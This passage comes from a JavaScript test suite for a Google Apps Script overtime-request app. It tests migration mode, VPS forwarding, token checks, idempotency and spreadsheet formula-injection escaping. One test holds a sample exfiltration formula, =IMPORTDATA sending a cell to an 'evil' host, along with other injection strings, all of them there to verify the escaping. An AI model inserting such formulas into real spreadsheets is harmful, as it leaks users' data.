      if (!m[1].endsWith('_') && !['doGet', 'doPost', 'onOpen', 'syncAllMasters', 'rebuildAccumulationSS' /* stubbed; real one tested below */].includes(m[1])) publicFns.push(m[1]);
    }
  }
  for (const fn of publicFns) throwsMatch(() => w.ctx[fn](), /新しいアドレスへ移りました/, fn);
  throwsMatch(() => w.ctx.getDb_(), /新しいアドレスへ移りました/, 'getDb_');
  eq(w.names('CalendarApp').length, 0, 'legacy calendar path not reached');
});
test('migration: getDb_-bypassing entry points (gap-4 F-7) are refused', () => {
  const w = migrated();
  for (const fn of ['setupAllTriggers_', 'setupTriggers_', 'setupSyncTrigger_', 'setupFormPollTrigger_', 'setupMorningBatchTrigger_',
    'setupMailTriggers_', 'cleanupFormSubmitTriggers_', 'reprocessAllResponses_', 'debugProcessLatest_', 'debugPollStatus_',
    'api_getHolidayCandidateDates_legacy_', 'manualBatchPdfs_']) {
    throwsMatch(() => w.ctx[fn](), /新しいアドレスへ移りました/, fn);
  }
  eq(w.props.POLL_LAST_TS, undefined, 'POLL_LAST_TS untouched');
  eq(w.names('newTrigger').length + w.names('deleteTrigger').length, 0, 'no trigger changes');
});
test('migration: time-trigger handlers return immediately', () => {
  const w = migrated();
  for (const fn of ['pollNewResponses_', 'nightlyUpdateAllForms_', 'morningBatchNoMail_', 'morningBatch_', 'syncAllMasters', 'sendEveningMail_', 'sendMorningMail_', 'handleFormSubmit_']) {
    eq(w.ctx[fn](), undefined, fn);
  }
  eq(w.names('getActive').length + w.names('tryLock').length + w.names('batchGeneratePdfs_').length, 0, 'nothing touched');
});
test('migration: onOpen shows only the moved menu item', () => {
  const w = migrated();
  w.ctx.onOpen();
  eq(w.names('menu')[0][1], ['showMigratedAddress']);
});
test('migration: internal vps.* still work (getDb_ allowed only inside authenticated call)', () => {
  const w = migrated();
  const p = w.post(vps('vps.ping')).json;
  eq([p.ok, p.migrationMode, p.migratedTo, p.dbId], [true, true, ORIGIN, 'DB1']);
  eq(w.post(vps('vps.renderPdf', { requestId: 'R-1', jobId: 'm1' })).json.pdf.status, 'created');
  eq(w.post(vps('internal.batchPdf', { requestId: 'R-4', jobId: 'm2' })).json.ok, true);
  eq(w.post(vps('internal.ledgerRewriteDay', { targetDate: '2026-11-25', jobId: 'm3' })).json.ok, true);
  throwsMatch(() => w.ctx.getDb_(), /新しいアドレスへ移りました/, 'flag reset after the call');
  eq(w.post(vps('vps.ping', { token: 'bad' })).json.error, 'unauthorized');
});
test('migration: Sebastian before forward URL is set -> "service is moving"', () => {
  const w = migrated();
  eq(w.post({ token: SEB_TOKEN, action: 'ping' }).json, { error: 'service is moving, retry later' });
  eq(w.names('fetch').length, 0);
});
test('migration: Sebastian actions forwarded verbatim to <origin>/api/sebastian; body returned verbatim', () => {
  const vpsBody = '{"ok":true,"requestId":"R-1","pdf":null,"x":"\\u3042"}';
  const w = migrated({ props: { SEBASTIAN_FORWARD_URL: ORIGIN + '/api/sebastian' }, fetch: { code: 200, body: vpsBody } });
  for (const action of ['ping', 'completeOvertime', 'markHolidayStart', 'markHolidayDone']) {
    const raw = JSON.stringify({ token: SEB_TOKEN, action, requestId: 'R-1', manualStartTime: '08:00' });
    const out = w.post(raw);
    eq(out.raw, vpsBody, 'verbatim ' + action);
    const f = w.names('fetch').pop();
    eq([f[1], f[2].method, f[2].payload, f[2].contentType, f[2].followRedirects, f[2].muteHttpExceptions, f[2].headers],
      [ORIGIN + '/api/sebastian', 'post', raw, 'application/json', false, true, { 'X-Overtime-Forwarded': 'gas' }]);
  }
  // wrong token / invalid JSON are forwarded too (VPS answers with the same errors as GAS)
  w.post('{bad'); eq(w.names('fetch').pop()[2].payload, '{bad');
  eq(w.names('getActive').length, 0, 'GAS did not open the DB');
});
test('migration: forward network failure / non-200 -> today error shape {error, action}', () => {
  const w = migrated({ props: { SEBASTIAN_FORWARD_URL: ORIGIN + '/api/sebastian' }, fetch: { throws: 'DNS error' } });
  eq(w.post({ token: SEB_TOKEN, action: 'completeOvertime', requestId: 'R-1' }).json, { error: 'upstream unavailable: DNS error' }, 'spec 4-4');
  const w2 = migrated({ props: { SEBASTIAN_FORWARD_URL: ORIGIN + '/api/sebastian' }, fetch: { code: 502, body: '<html>' } });
  eq(w2.post({ token: SEB_TOKEN, action: 'ping' }).json, { error: 'upstream error: 502' }, 'spec 4-4');
  const w3 = migrated({ props: { SEBASTIAN_FORWARD_URL: ORIGIN + '/api/sebastian' }, fetch: { code: 200, body: '<html>challenge</html>' } });
  eq(w3.post({ token: SEB_TOKEN, action: 'ping' }).json, { error: 'upstream error: 200' }, '200 but not JSON is not passed through');
});

// --- operator functions
test('enterMigrationMode: refused unless active user == effective user; origin required & validated', () => {
  const w = makeWorld({ users: { active: 'someone@x' } });
  throwsMatch(() => w.ctx.enterMigrationMode(ORIGIN), /スクリプトの持ち主/);
  const w0 = makeWorld({ users: { active: '' } });
  throwsMatch(() => w0.ctx.enterMigrationMode(ORIGIN), /スクリプトの持ち主/);
  const w2 = makeWorld();
  throwsMatch(() => w2.ctx.enterMigrationMode(), /https:\/\//);
  throwsMatch(() => w2.ctx.enterMigrationMode('http://x.test'), /https:\/\//);
  throwsMatch(() => w2.ctx.enterMigrationMode(ORIGIN + '/path'), /https:\/\//);
  throwsMatch(() => w2.ctx.enterMigrationModeForOvertime(), /VPS_ORIGIN/);
  eq(w2.props.MIGRATED_TO_URL, undefined);
  eq(w2.ctx.enterMigrationMode(ORIGIN + '/'), ORIGIN);
  eq(w2.props.MIGRATED_TO_URL, ORIGIN);
  throwsMatch(() => w2.ctx.api_getDashboard(), /新しいアドレスへ移りました/, 'cache invalidated');
});
test('enterMigrationModeForOvertime reads VPS_ORIGIN; setSebastianForwardUrl; exit clears both', () => {
  const w = makeWorld({ props: { VPS_ORIGIN: ORIGIN } });
  eq(w.ctx.enterMigrationModeForOvertime(), ORIGIN);
  eq(w.ctx.setSebastianForwardUrl(), ORIGIN + '/api/sebastian');
  eq(w.ctx.showMigrationStatus().sebastianForwardUrl, ORIGIN + '/api/sebastian');
  w.ctx.exitMigrationMode();
  eq([w.props.MIGRATED_TO_URL, w.props.SEBASTIAN_FORWARD_URL], [undefined, undefined]);
  eq(w.post({ token: SEB_TOKEN, action: 'ping' }).json.ok, true, 'back to GAS handling');
});
test('close/reopen forms: only the ones that were accepting, logged and recorded', () => {
  const w = makeWorld();
  const r = w.ctx.closeAllFormsForMigration();
  eq([r.closed, r.alreadyClosed, r.errors.length], [2, 1, 0]);
  eq([w.forms['FORM-A'].accepting, w.forms['FORM-B'].accepting, w.forms['FORM-C'].accepting], [false, false, false]);
  eq(JSON.parse(w.props.MIGRATION_CLOSED_FORMS).map(x => x.formId), ['FORM-A', 'FORM-C']);
  w.props.MIGRATED_TO_URL = ORIGIN; // reopen must work regardless of mode (reads record, not DB)
  const back = w.ctx.reopenFormsAfterRollback();
  eq(back.reopened, 2);
  eq([w.forms['FORM-A'].accepting, w.forms['FORM-B'].accepting, w.forms['FORM-C'].accepting], [true, false, true]);
  eq(w.props.MIGRATION_CLOSED_FORMS, undefined);
  throwsMatch(() => makeWorld({ users: { active: 'a@x' } }).ctx.closeAllFormsForMigration(), /スクリプトの持ち主/);
});
test('remove triggers lists what it deleted; restore recreates (2 core / all 4)', () => {
  const w = makeWorld();
  w.props.MIGRATED_TO_URL = ORIGIN;
  const r = w.ctx.removeAllTriggersForMigration();
  eq(r.removed.length, 4); eq(w.triggers.length, 0);
  throwsMatch(() => w.ctx.restoreTriggersAfterRollback(), /移転モードのまま/);
  w.ctx.exitMigrationMode();
  eq(w.ctx.restoreTriggersAfterRollback().sort(), ['morningBatchNoMail_', 'syncAllMasters']);
  w.ctx.restoreAllTriggersAfterRollback();
  eq(w.triggers.map(t => t.fn).sort(), ['morningBatchNoMail_', 'nightlyUpdateAllForms_', 'pollNewResponses_', 'syncAllMasters']);
});
test('timing-safe compare', () => {
  const w = makeWorld();
  eq([w.ctx.vpsTimingSafeEqual_('abc', 'abc'), w.ctx.vpsTimingSafeEqual_('abc', 'abd'), w.ctx.vpsTimingSafeEqual_('abc', 'abcd'), w.ctx.vpsTimingSafeEqual_(undefined, '')], [true, false, false, true]);
});


// --- follow-up (team M integration): spec 7-1/7-2 names
test('ping returns scriptId and spec 7-2 names (plus the first-version names)', () => {
  const w = makeWorld({ props: { SEBASTIAN_FORWARD_URL: ORIGIN + '/api/sebastian' } });
  w.db.sheets.Settings.data.push(['ACCUMULATION_SS_ID', 'ACC1']);
  const r = w.post({ internal: true, token: VPS_TOKEN, action: 'internal.ping' }).json;
  eq([r.ok, r.scriptId, r.spreadsheetId, r.dbId, r.spreadsheetTimeZone, r.dbTimeZone, r.scriptTimeZone, r.migrated, r.forwardUrlSet, r.apiVersion, r.accumulationKeyRows],
    [true, 'SCRIPT-ID-1', 'DB1', 'DB1', 'Asia/Tokyo', 'Asia/Tokyo', 'Asia/Tokyo', false, true, 1, 2]);
  assert('SOURCE_SSID' in r.settings, 'settings.SOURCE_SSID');
  eq(w.post(vps('vps.ping')).json.scriptId, 'SCRIPT-ID-1');
});
test('router has every action named in spec 7-2 (+ vps.* names)', () => {
  const w = makeWorld();
  const names = Object.keys(w.ctx.VPS_INTERNAL_ROUTES_ || vm.runInContext('VPS_INTERNAL_ROUTES_', w.ctx));
  for (const a of ['internal.ping', 'internal.afterApprove', 'internal.afterComplete', 'internal.regenerate', 'internal.ledgerUpsert',
    'internal.afterDelete', 'internal.batchPdf', 'internal.ledgerRewriteDay', 'internal.ledgerRebuild',
    'vps.ping', 'vps.renderPdf', 'vps.upsertLedger', 'vps.removeLedgerRow', 'vps.morningBatch', 'vps.ledgerRewriteDay', 'vps.ledgerRebuild']) {
    assert(names.includes(a), 'missing ' + a);
  }
});
test('internal.ledgerUpsert == vps.upsertLedger', () => {
  const w = makeWorld();
  const r = w.post({ internal: true, token: VPS_TOKEN, action: 'internal.ledgerUpsert', jobId: 'lu1', requestId: 'R-1' }).json;
  eq([r.ok, r.ledger.status], [true, 'upserted']);
  eq(w.names('upsertAccumulationRow_').map(c => c[1]), ['R-1']);
});
test('internal.ledgerRebuild / vps.ledgerRebuild run rebuildAccumulationSS and return counts (also in migration mode)', () => {
  const w = migrated();
  const r = w.post({ internal: true, token: VPS_TOKEN, action: 'internal.ledgerRebuild', jobId: 'rb1' }).json;
  eq([r.ok, r.ledger.status, r.counts], [true, 'rebuilt', { processedRows: 12, sheets: 2, writtenRows: 12, backups: 1 }]);
  eq(w.post(vps('vps.ledgerRebuild', { jobId: 'rb2' })).json.ok, true);
  eq(w.names('rebuildAccumulationSS').length, 2);
  const w2 = makeWorld({ ledgerMissing: true });
  const r2 = w2.post(vps('vps.ledgerRebuild', { jobId: 'rb3' })).json;
  eq([r2.error, r2.retryable], ['ledger_unavailable', true]);
  eq(w2.names('rebuildAccumulationSS').length, 0, 'does not create a new ledger');
});
test('real rebuildAccumulationSS: refused in migration mode unless inside the authenticated internal call', () => {
  const w = migrated();
  throwsMatch(() => w.ctx.__realRebuild(), /新しいアドレスへ移りました/);
});
test('PDF results carry pdfGeneratedAtEpochMs (number) with the JST string', () => {
  const w = makeWorld();
  const r = w.post(vps('vps.renderPdf', { requestId: 'R-1', jobId: 'ep1' })).json;
  eq([r.pdfGeneratedAt, r.pdfGeneratedAtEpochMs, r.pdf.pdfGeneratedAtEpochMs], ['2026-11-26 09:00:00', Date.parse('2026-11-26T00:00:00Z'), Date.parse('2026-11-26T00:00:00Z')]);
  w.db.sheets.Requests.data[2][12] = '2026-11-25 18:30:00';
  const a = w.post(vps('vps.renderPdf', { requestId: 'R-2', jobId: 'ep2' })).json;
  eq([a.pdf.status, a.pdfGeneratedAtEpochMs], ['already', Date.parse('2026-11-25T18:30:00+09:00')]);
  const n = w.post(vps('vps.renderPdf', { requestId: 'R-3', jobId: 'ep3' })).json;
  eq(n.pdfGeneratedAtEpochMs, null);
});
test('afterComplete: statusAtEnqueue != approved -> no PDF, ledger still; wlOverride passed; sebastian ignores override', () => {
  const w = makeWorld();
  const r = w.post(vps('internal.afterComplete', { requestId: 'R-1', jobId: 'sa1', args: { source: 'screen', statusAtEnqueue: 'submitted' } })).json;
  eq([r.pdf.status, r.pdf.reason, r.ledger.status], ['skipped', 'not_approved_at_enqueue', 'upserted']);
  const wl = { actualStartAt: '2026-11-25 17:20:00', actualEndAt: '2026-11-25 19:10:00', actualMinutes: 110, breakMinutes: 10, netMinutes: 100 };
  w.post(vps('internal.afterComplete', { requestId: 'R-1', jobId: 'sa2', args: { source: 'admin', statusAtEnqueue: 'approved', wlOverride: wl } }));
  eq(w.names('generatePdfDirect_').pop()[2], wl);
  const w2 = makeWorld();
  w2.post(vps('internal.afterComplete', { requestId: 'R-1', jobId: 'sa3', args: { source: 'sebastian', statusAtEnqueue: 'approved', wlOverride: wl } }));
  eq(w2.names('generatePdfForRequest_').pop()[2], null, 'sebastian: no override, XLOOKUP');
});
test('batchPdf: existing pdfFileId -> skipped; PDF exception -> ok:true with pdf.status=error', () => {
  const w = makeWorld({ pdfFail: { 'R-1': true } });
  eq(w.post(vps('internal.batchPdf', { requestId: 'R-2', jobId: 'bp1' })).json.pdf.status, 'skipped');
  const r = w.post(vps('internal.batchPdf', { requestId: 'R-1', jobId: 'bp2' })).json;
  eq([r.ok, r.pdf.status, r.pdf.error], [true, 'error', 'PDFエクスポートに失敗しました: HTTP 500']);
  eq(w.names('upsertAccumulationRow_').length, 0);
});

// --- round 2 (review fixes)
// security high-1: formula injection into the ledger / PDF template
test('sheetLiteral_: = + - @ get a leading apostrophe; everything else unchanged', () => {
  const w = makeWorld();
  const L = w.ctx.sheetLiteral_;
  eq(['=HYPERLINK("x","y")', '+1+2', '-5', '@a', ' =x', '加工班', 'その他\n=x', '', 60, null].map(v => L(v)),
    ["'=HYPERLINK(\"x\",\"y\")", "'+1+2", "'-5", "'@a", ' =x', '加工班', 'その他\n=x', '', 60, null]);
  const d = new Date('2026-11-25T03:00:00Z');
  eq(L(d), d, 'Date untouched');
});
test('buildAccRow_: user text starting with = + - @ is written as literal text; normal rows identical', () => {
  const w = makeWorld();
  const base = { requestId: 'R-1', requestType: 'overtime', status: 'approved', dept: '加工班', workerName: '山田', workerCode: '001',
    reason: '納期対応', reasonDetail: '', workContent: '検査', approvedMinutes: 60, pdfFileId: '' };
  const d = new Date('2026-11-25T03:00:00Z');
  const normal = w.ctx.buildAccRow_(Object.assign({}, base), {}, d);
  eq(normal.slice(4, 10), ['加工班', '001', '山田', '納期対応', '', '検査'], 'normal values unchanged');
  const evil = w.ctx.buildAccRow_(Object.assign({}, base, { dept: '=1', workerName: '@x', reason: '+A1',
    reasonDetail: '-B2', workContent: '=IMPORTDATA("https://evil/?d="&A2)' }), {}, d);
  eq(evil.slice(4, 10), ["'=1", '001', "'@x", "'+A1", "'-B2", "'=IMPORTDATA(\"https://evil/?d=\"&A2)"]);
  eq(evil[0], 'R-1'); eq(evil[10], 60, 'numbers untouched');
});
test('fillPdfTemplate_: dept/name/workNo/workContent/reason written as literal text; normal values unchanged', () => {
  const w = makeWorld();
  w.ctx._vpsInternalCall_ = false;
  const sheet = w.db.insertSheet('PDFTEST');
  sheet.getColumnWidth = () => 100; sheet.getRowHeight = () => 20;
  const reqData = { 'requestType(overtime/holiday)': 'overtime', targetDate: '2026-11-25', dept: '=1+1', workerName: '山田',
    workNo1: '+81', workContent: '@SUM(A1)', reason: 'その他（→補足理由必須）', reasonDetail: '=HYPERLINK("x")', approvedMinutes: 60 };
  const wl = { actualStartAt: '2026-11-25 17:20:00', actualEndAt: '2026-11-25 19:00:00', actualMinutes: 100, breakMinutes: 10, netMinutes: 90 };
  w.ctx.fillPdfTemplate_(sheet, reqData, 'R-1', wl);
  const cell = a1 => sheet.getRange(a1).getValue();
  eq([cell('B4'), cell('D4'), cell('B18'), cell('A23'), cell('A29')],
    ["'=1+1", '山田', "'+81", "'@SUM(A1)", 'その他\n=HYPERLINK("x")'], 'reason text starts with その他 -> unchanged');
  const s2 = w.db.insertSheet('PDFTEST2');
  w.ctx.fillPdfTemplate_(s2, Object.assign({}, reqData, { dept: '加工班', reason: '=x', reasonDetail: '' }), 'R-1', wl);
  eq([s2.getRange('B4').getValue(), s2.getRange('A29').getValue()], ['加工班', "'=x"]);
});
test('XLOOKUP path writes the reason through sheetLiteral_ (source check)', () => {
  const src = fs.readFileSync(path.join(SRC, 'pdfExport.gs'), 'utf8');
  assert(src.includes('formSheet.getRange(PDF_MAP.reason).setValue(sheetLiteral_(reasonText));'), 'XLOOKUP reason');
  const bare = src.match(/setValue\((normalize_\(reqData\['(dept|workerName)'\]\)|workNo|customer|product|workContent|reasonText|buildReasonText_\([^)]*\))\)/g);
  eq(bare, null, 'no user-text setValue without sheetLiteral_');
});

// security mid-2 / data-safety high-1: trash only PDFs under PDF_ROOT_FOLDER_ID
test('trash guard: PDF outside PDF_ROOT_FOLDER_ID is not trashed -> trashSkipped, regeneration continues', () => {
  const w = makeWorld();
  w.db.sheets.Requests.data[2][13] = 'OUTSIDE';
  const r = w.post(vps('internal.regenerate', { requestId: 'R-2', jobId: 'tg1', args: { reason: 'secondary', oldPdfFileId: 'OUTSIDE' } })).json;
  eq([r.ok, r.trash.status, r.trash.reason, r.trash.trashSkipped, r.trashSkipped, r.pdf.status], [true, 'skipped', 'outside_pdf_root', true, true, 'created']);
  eq(w.names('trash').length, 0, 'setTrashed never called');
});
test('trash guard: non-PDF, too deep, missing PDF_ROOT_FOLDER_ID -> skipped; afterDelete with a foreign id -> skipped', () => {
  const w = makeWorld();
  const sh = w.db.sheets.Requests; sh.data[2][12] = ''; sh.data[2][13] = ''; sh.data[2][14] = '';
  eq(w.post(vps('vps.renderPdf', { requestId: 'R-2', jobId: 'tg2', oldPdfFileId: 'NOTPDF' })).json.trash.reason, 'not_pdf');
  eq(w.post(vps('internal.afterDelete', { requestId: 'R-X', jobId: 'tg3', args: { oldPdfFileId: 'DEEP', requestType: 'overtime', targetDate: '2026-11-25' } })).json.trash.reason, 'outside_pdf_root');
  const r = w.post(vps('internal.afterDelete', { requestId: 'R-X', jobId: 'tg4', args: { oldPdfFileId: 'OUTSIDE', requestType: 'overtime', targetDate: '2026-11-25' } })).json;
  eq([r.ok, r.trash.status, r.trashSkipped, r.ledger.status], [true, 'skipped', true, 'removed']);
  eq(w.names('trash').length, 0);
  const w2 = makeWorld();
  w2.db.sheets.Settings.data[4][1] = '';
  const r2 = w2.post(vps('internal.afterDelete', { requestId: 'R-2', jobId: 'tg5', args: { oldPdfFileId: 'OLDPDF' } })).json;
  eq([r2.trash.status, r2.trash.reason], ['skipped', 'pdf_root_not_set']);
  eq(w2.names('trash').length, 0);
  eq(w2.reqRow('R-2').pdfFileId, '', 'sheet columns still cleared as today');
});
test('trash guard: PDF in a date folder under the root is trashed (2 levels); Drive error still reported as error', () => {
  const w = makeWorld();
  const r = w.post(vps('internal.afterDelete', { requestId: 'R-2', jobId: 'tg6', args: { oldPdfFileId: 'OLDPDF' } })).json;
  eq([r.trash.status, r.trashSkipped], ['trashed', undefined]);
  const r2 = w.post(vps('internal.afterDelete', { requestId: 'R-X', jobId: 'tg7', args: { oldPdfFileId: 'MISSING', requestType: 'overtime', targetDate: '2026-11-25' } })).json;
  eq(r2.trash.status, 'error');
});

// security mid-2: workLog override range/format
test('workLog override: bad format / wrong type -> bad_request (not stored as retryable), nothing generated', () => {
  const w = makeWorld();
  const good = { actualStartAt: '2026-11-25 17:20:00', actualEndAt: '2026-11-25 19:00:00', actualMinutes: 100, breakMinutes: 10, netMinutes: 90 };
  const bads = [
    Object.assign({}, good, { actualEndAt: '19:00' }),
    Object.assign({}, good, { actualStartAt: '2026-11-25T17:20:00Z' }),
    Object.assign({}, good, { actualMinutes: '1e3' }),
    Object.assign({}, good, { netMinutes: 'abc' }),
    Object.assign({}, good, { breakMinutes: true }),
    Object.assign({}, good, { actualEndAt: 1764000000000 }),
    [good], 'x',
  ];
  bads.forEach((wl, i) => {
    const r = w.post(vps('internal.afterComplete', { requestId: 'R-1', jobId: 'wv' + i, args: { source: 'screen', wlOverride: wl } })).json;
    eq([r.ok, r.error, r.retryable], [false, 'bad_request', false], 'case ' + i);
  });
  eq(w.names('generatePdfDirect_').length + w.names('upsertAccumulationRow_').length, 0);
  w.post(vps('internal.afterComplete', { requestId: 'R-1', jobId: 'wv-ok', args: { source: 'screen', wlOverride: Object.assign({}, good, { netMinutes: '90', extra: 'ignored' }) } }));
  eq(w.names('generatePdfDirect_')[0][2], Object.assign({}, good, { netMinutes: 90 }), 'numeric string accepted; only the 5 keys passed');
});

test('workLog override (verify-fixes R-1): end before start and > 24h are accepted like today\'s GAS', () => {
  const w = makeWorld();
  // completion pressed before 17:20 (end < start, negative minutes)
  const early = { actualStartAt: '2026-11-25 17:20:00', actualEndAt: '2026-11-25 17:05:00', actualMinutes: -15, breakMinutes: 0, netMinutes: -15 };
  const r1 = w.post(vps('internal.afterComplete', { requestId: 'R-1', jobId: 'r1a', args: { source: 'screen', wlOverride: early } })).json;
  eq([r1.ok, r1.pdf.status, r1.ledger.status], [true, 'created', 'upserted']);
  eq(w.names('generatePdfDirect_').pop()[2], early);
  // completion after midnight of the next day (> 1440 minutes)
  const w2 = makeWorld();
  const long = { actualStartAt: '2026-11-25 08:00:00', actualEndAt: '2026-11-26 09:30:00', actualMinutes: 1530, breakMinutes: '60', netMinutes: '1470' };
  const r2 = w2.post(vps('internal.afterComplete', { requestId: 'R-1', jobId: 'r1b', args: { source: 'admin', wlOverride: long } })).json;
  eq([r2.ok, r2.pdf.status, r2.ledger.status], [true, 'created', 'upserted']);
  eq(w2.names('generatePdfDirect_').pop()[2], Object.assign({}, long, { breakMinutes: 60, netMinutes: 1470 }));
  // empty end time is passed through as empty
  const w3 = makeWorld();
  const r3 = w3.post(vps('internal.afterComplete', { requestId: 'R-1', jobId: 'r1c', args: { source: 'screen',
    wlOverride: { actualStartAt: '2026-11-25 17:20:00', actualEndAt: '', actualMinutes: '', breakMinutes: 0, netMinutes: 0 } } })).json;
  eq(r3.ok, true);
  eq(w3.names('generatePdfDirect_').pop()[2].actualEndAt, '');
});

// data-safety high-3 cooperation: ping reports migrated reliably and cheaply
test('ping: migrated is always a boolean, read fresh every call (no stale cache)', () => {
  const w = makeWorld();
  const a = w.post(vps('internal.ping')).json;
  eq([a.migrated, a.migrationMode], [false, false]);
  w.props.MIGRATED_TO_URL = ORIGIN; // changed by the operator; per-execution cache must not hide it
  const b = w.post(vps('internal.ping')).json;
  eq([b.migrated, b.migrationMode, b.migratedTo], [true, true, ORIGIN]);
  delete w.props.MIGRATED_TO_URL;
  eq(w.post(vps('internal.ping')).json.migrated, false);
});
test('ping light: no DB open, returns migrated/scriptId/version only', () => {
  const w = migrated();
  const r = w.post(vps('internal.ping', { light: true })).json;
  eq([r.ok, r.light, r.migrated, r.scriptId, r.apiVersion], [true, true, true, 'SCRIPT-ID-1', 1]);
  eq(r.dbId, undefined); eq(w.names('getActive').length, 0, 'DB not opened');
});
test('ping: script properties unreadable for MIGRATED_TO_URL -> migrated:false + migratedReadError (VPS refuses writes)', () => {
  const w = makeWorld({ props: { MIGRATED_TO_URL: ORIGIN } });
  w.post(vps('internal.ping')); // token read works
  w.propFaults.readThrows = /^MIGRATED_TO_URL$/;
  const r = w.post(vps('internal.ping', { light: true })).json;
  eq([r.migrated, r.migratedReadError], [false, true]);
});

// token rules
test('internal token: 31 chars refused; 32 chars accepted; Sebastian path unaffected', () => {
  const t31 = 'a'.repeat(31), t32 = 'b'.repeat(32);
  const w = makeWorld({ props: { VPS_INTERNAL_TOKEN: t31 } });
  eq(w.post({ token: t31, action: 'internal.ping' }).json.error, 'unauthorized');
  eq(w.post({ token: SEB_TOKEN, action: 'ping' }).json.ok, true);
  const w2 = makeWorld({ props: { VPS_INTERNAL_TOKEN: t32 } });
  eq(w2.post({ token: t32, action: 'internal.ping' }).json.ok, true);
});

// data-safety mid-6: ledger upsert failure is detected
test('ledger upsert silently failing -> ledger_upsert_failed retryable (upsertLedger) / ledger_failed (renderPdf), not stored', () => {
  const w = makeWorld({ upsertSilentFail: true });
  const r = w.post(vps('vps.upsertLedger', { requestId: 'R-1', jobId: 'lf1' })).json;
  eq([r.ok, r.error, r.retryable, r.ledger.status], [false, 'ledger_upsert_failed', true, 'error']);
  assert(!w.props.VPSJOB_lf1, 'not stored');
  const a = w.post(vps('internal.afterApprove', { requestId: 'R-1', jobId: 'lf2' })).json;
  eq([a.ok, a.error, a.retryable, a.pdf.status, a.ledger.status], [false, 'ledger_failed', true, 'created', 'error']);
  assert(/^PDF-R-1-/.test(a.pdfFileId), 'PDF columns still returned so the VPS records them');
  assert(!w.props.VPSJOB_lf2, 'not stored -> same jobId retried');
});
test('ledger upsert success is verified by reading the row back', () => {
  const w = makeWorld();
  eq(w.post(vps('vps.upsertLedger', { requestId: 'R-1', jobId: 'lv1' })).json.ledger.status, 'upserted');
  eq(w.ledger.sheets['残業_2026年度'].data.filter(r => r[0] === 'R-1').length, 1);
});

// data-safety mid-3: idempotency store size and failure reporting
test('idempotency: keeps at most 100 records; idempotencyStored true/false reported', () => {
  const w = makeWorld();
  for (let i = 0; i < 120; i++) w.props['VPSJOB_old' + i] = JSON.stringify({ t: Date.now() - 1000 + i, state: 'done', action: 'x', result: { ok: true } });
  const r = w.post(vps('vps.upsertLedger', { requestId: 'R-1', jobId: 'is1' })).json;
  eq(r.idempotencyStored, true);
  const n = Object.keys(w.props).filter(k => k.startsWith('VPSJOB_')).length;
  assert(n <= 101, 'records kept: ' + n);
  assert(w.props.VPSJOB_is1, 'newest kept');
  w.propFaults.writeThrows = /^VPSJOB_/;
  const r2 = w.post(vps('vps.upsertLedger', { requestId: 'R-1', jobId: 'is2' })).json;
  eq([r2.ok, r2.idempotencyStored], [true, false]);
});
test('idempotency: an oversized result is stored slim (<= 3000 chars) and still replays the PDF columns', () => {
  const w = makeWorld({ pdfFail: {} });
  const big = 'x'.repeat(5000);
  w.ctx.generatePdfDirect_ = () => { throw new Error(big); };
  const r = w.post(vps('internal.batchPdf', { requestId: 'R-1', jobId: 'big1' })).json;
  eq([r.ok, r.pdf.status], [true, 'error']);
  assert(w.props.VPSJOB_big1.length <= 3000, 'stored ' + w.props.VPSJOB_big1.length);
  const rp = w.post(vps('internal.batchPdf', { requestId: 'R-1', jobId: 'big1' })).json;
  eq([rp.replayed, rp.ok, rp.pdf.status, rp.requestId], [true, true, 'error', 'R-1']);
});

// data-safety mid-4: ledgerRebuild is never re-run with the same jobId after it started
test('ledgerRebuild: a started-but-unfinished jobId is not re-run (stale or not); other actions still re-run after stale', () => {
  const w = makeWorld();
  w.props.VPSJOB_rbX = JSON.stringify({ t: Date.now() - 8 * 60 * 1000, state: 'running', action: 'internal.ledgerRebuild' });
  const r = w.post(vps('internal.ledgerRebuild', { jobId: 'rbX' })).json;
  eq([r.ok, r.error, r.retryable], [false, 'previous_attempt_unfinished', false]);
  w.props.VPSJOB_rbY = JSON.stringify({ t: Date.now(), state: 'running', action: 'internal.ledgerRebuild' });
  eq(w.post(vps('internal.ledgerRebuild', { jobId: 'rbY' })).json.error, 'busy');
  eq(w.names('rebuildAccumulationSS').length, 0);
  eq(w.post(vps('internal.ledgerRebuild', { jobId: 'rbZ' })).json.ok, true, 'new jobId runs');
  w.props.VPSJOB_up = JSON.stringify({ t: Date.now() - 8 * 60 * 1000, state: 'running', action: 'vps.upsertLedger' });
  eq(w.post(vps('vps.upsertLedger', { requestId: 'R-1', jobId: 'up' })).json.ok, true, 'stale running of other actions re-runs');
});
test('ledgerRebuild: a retryable failure keeps the running marker (no silent re-run)', () => {
  const w = makeWorld();
  w.ctx.rebuildAccumulationSS = () => ({ rebuilt: false, reason: 'timeout' });
  const r = w.post(vps('internal.ledgerRebuild', { jobId: 'rbF' })).json;
  eq([r.ok, r.retryable], [false, true]);
  assert(w.props.VPSJOB_rbF && JSON.parse(w.props.VPSJOB_rbF).state === 'running', 'marker kept');
});

// editor-only secret/origin setters: never log or return the token value
test('setInternalToken: generates 64 chars or takes a >=32-char argument; value never logged/returned; owner only', () => {
  const w = makeWorld({ props: { VPS_INTERNAL_TOKEN: '' } });
  const r = w.ctx.setInternalToken();
  eq([r.saved, r.length, w.props.VPS_INTERNAL_TOKEN.length], [true, 64, 64]);
  const given = 'Z'.repeat(40);
  eq(w.ctx.setInternalToken(given), { saved: true, length: 40 });
  eq(w.props.VPS_INTERNAL_TOKEN, given);
  assert(!w.log.some(l => l.includes(given)) && !JSON.stringify(r).includes(w.props.VPS_INTERNAL_TOKEN), 'value not logged/returned');
  throwsMatch(() => w.ctx.setInternalToken('short'), /32 字以上/);
  throwsMatch(() => w.ctx.setInternalToken(SEB_TOKEN), /SEBASTIAN_API_TOKEN と別/);
  assert(!w.log.some(l => l.includes(SEB_TOKEN)), 'refused value not logged');
  eq(w.props.VPS_INTERNAL_TOKEN, given, 'unchanged after refusal');
  throwsMatch(() => makeWorld({ users: { active: 'x@x' } }).ctx.setInternalToken(given), /スクリプトの持ち主/);
  eq(w.post({ token: given, action: 'internal.ping' }).json.ok, true, 'works with the endpoint');
});
test('setVpsOrigin: validates https origin, stores VPS_ORIGIN, does not enter migration mode', () => {
  const w = makeWorld();
  eq(w.ctx.setVpsOrigin(ORIGIN + '/'), ORIGIN);
  eq([w.props.VPS_ORIGIN, w.props.MIGRATED_TO_URL], [ORIGIN, undefined]);
  throwsMatch(() => w.ctx.setVpsOrigin('http://x'), /https:\/\//);
  eq(w.ctx.enterMigrationModeForOvertime(), ORIGIN);
});

// ---------------------------------------------------------------- report
let failed = 0;
for (const r of results) {
  if (r.ok) console.log('PASS ' + r.name);
